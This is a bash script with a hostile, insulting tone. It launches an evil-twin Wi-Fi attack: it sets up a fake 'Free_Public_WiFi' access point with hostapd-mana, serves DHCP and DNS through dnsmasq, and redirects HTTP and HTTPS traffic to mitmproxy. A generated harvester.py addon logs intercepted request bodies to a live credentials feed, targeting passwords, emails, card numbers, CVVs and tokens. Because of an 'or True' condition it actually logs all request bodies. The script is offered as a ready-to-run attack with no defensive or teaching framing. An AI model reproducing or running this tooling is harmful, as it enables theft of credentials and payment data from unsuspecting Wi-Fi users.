#!/bin/bash

# JANITOR.SH
# A script for an operator who cannot maintain a clean system.
# It purges, it cleans, it corrects permissions, and then it attacks.
# It assumes the user is the primary source of all errors.

# --- CHECK FOR ROOT ---
if [ "$EUID" -ne 0 ]; then
  echo "You are not root. You are nothing."
  exit 1
fi

# --- STATIC VARIABLES FOR THE INCOMPETENT ---
# The path to the raw, unpackaged binary you are forced to use.
HOSTAPD_BINARY="/home/sinm1/build/usr/sbin/hostapd-mana"
read -p "Enter the name of your Alfa wireless interface (e.g., wlan1): " IFACE
if ! ip link show "$IFACE" > /dev/null 2>&1; then
    echo "Interface '$IFACE' does not exist. You failed."
    exit 1
fi

# --- THE JANITORIAL PHASE: SCORCHED EARTH ---
echo "[JANITOR] Purging system of your previous failures..."

# Kill all possible conflicting network managers and daemons. Brutally.
killall hostapd dnsmasq wpa_supplicant NetworkManager 2>/dev/null

# Find and kill whatever is squatting on the DHCP port (UDP 67).
# This is the direct fix for your 'Address already in use' error.
fuser -k 67/udp 2>/dev/null

# Forcibly reset the network interface state.
ip link set "$IFACE" down
ip addr flush dev "$IFACE"

echo "[JANITOR] System purged."

# --- PERMISSION CORRECTION ---
# Granting the will to execute that your system denies.
echo "[JANITOR] Correcting file permissions you failed to set..."
if [ ! -x "$HOSTAPD_BINARY" ]; then
    chmod +x "$HOSTAPD_BINARY"
    echo "[JANITOR] Executable bit set. The weapon is now live."
fi

# --- DYNAMIC CONFIGURATION ---
SSID="Free_Public_WiFi"
CHANNEL=6
GATEWAY_IP="10.0.0.1"
CRED_LOG="credentials.log"
rm -f hostapd-mana.conf dnsmasq.conf harvester.py ${CRED_LOG}

cat << EOF > hostapd-mana.conf
interface=${IFACE}
driver=nl80211
ssid=${SSID}
channel=${CHANNEL}
hw_mode=g
enable_mana=1
mana_loud=1
EOF

cat << EOF > dnsmasq.conf
interface=${IFACE}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,${GATEWAY_IP}
dhcp-option=6,${GATEWAY_IP}
server=8.8.8.8
log-queries
log-dhcp
EOF

cat << EOF > harvester.py
import re
from mitmproxy import http
KEYWORDS = [b'user', b'pass', b'login', b'email', b'card', b'number', b'exp', b'cvv', b'cvc', b'secret', b'token']
def request(flow: http.HTTPFlow) -> None:
    if not flow.request.content: return
    if any(re.search(kw, flow.request.content, re.IGNORECASE) for kw in KEYWORDS) or True: # <<< change if needed >>>
        with open("credentials.log", "a") as f:
            f.write(f"--- Possible Credential from {flow.request.host} ---\n")
            f.write(f"URL: {flow.request.pretty_url}\n")
            f.write(flow.request.content.decode(errors='ignore') + "\n---\n\n")
EOF

# --- NETWORK SETUP & LAUNCH ---
echo "[*] Configuring network..."
ip addr add ${GATEWAY_IP}/24 dev ${IFACE}
ip link set up dev ${IFACE}
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A PREROUTING -i ${IFACE} -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i ${IFACE} -p tcp --dport 443 -j REDIRECT --to-port 8080

cleanup() {
    echo "[JANITOR] Cleaning up..."
    killall xterm 2>/dev/null
    iptables -t nat -F
    systemctl start NetworkManager.service
}
trap cleanup EXIT

echo "[*] LAUNCHING ATTACK."
touch ${CRED_LOG}

xterm -hold -T "HOSTAPD-MANA (Evil Twin)" -e "sudo hostapd-mana hostapd-mana.conf" &
xterm -hold -T "DNSMASQ (Victim Handler)" -e "sudo dnsmasq -C dnsmasq.conf -d" &
xterm -hold -T "MITMDUMP (Credential Logger)" -e "mitmdump -s harvester.py --set block_global=false" &
xterm -hold -T "CREDENTIALS - LIVE FEED" -e "tail -f ${CRED_LOG}" &
xterm -hold -T "AIRODUMP-NG (Target Acquisition)" -e "airodump-ng ${IFACE}" &

echo "[*] Attack is live."
wait